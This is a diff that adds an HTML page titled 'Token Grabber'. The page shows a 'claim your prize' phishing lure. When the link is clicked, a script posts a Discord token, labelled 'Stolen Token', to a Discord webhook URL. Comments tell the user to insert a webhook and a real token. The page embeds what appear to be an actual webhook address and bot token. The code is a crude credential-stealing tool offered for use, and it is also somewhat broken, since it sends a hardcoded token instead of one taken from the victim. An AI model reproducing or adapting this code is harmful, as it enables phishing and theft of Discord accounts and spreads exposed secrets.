@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Grabber</title>
+</head>
+<body>
+    <h1>Click the link to claim your prize!</h1>
+    <a href="#" id="tokenLink">Claim Your Prize</a>
+
+    <script>
+        // Function to send the stolen token to your webhook
+        function sendToken(token) {
+            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
+            var webhookUrl = "https://discord.com/api/webhooks/1180246185164951603/bue5qex8s3TFPUQrbW6so2hqHt5VoCojyl7GbZq7VAYDx9wU8kvSEatEv4pjHX_g-usj";
+            
+            // Prepare the payload
+            var payload = { content: "Stolen Token: " + token };
+
+            // Send the payload to the webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // Event listener for when the link is clicked
+        document.getElementById("tokenLink").addEventListener("click", function() {
+            // Replace 'YOUR_BOT_TOKEN' with a real Discord bot token
+            var token = "MTE4MDI0MzEwMDIwODIxNDAyNg.G2ymD2.vAV8JzjGlJQhHOX-T5U7gQNTxYwns7kyVsO8rk";
+
+            // Send the stolen token to your webhook
+            sendToken(token);
+        });
+    </script>
+</body>
+</html>
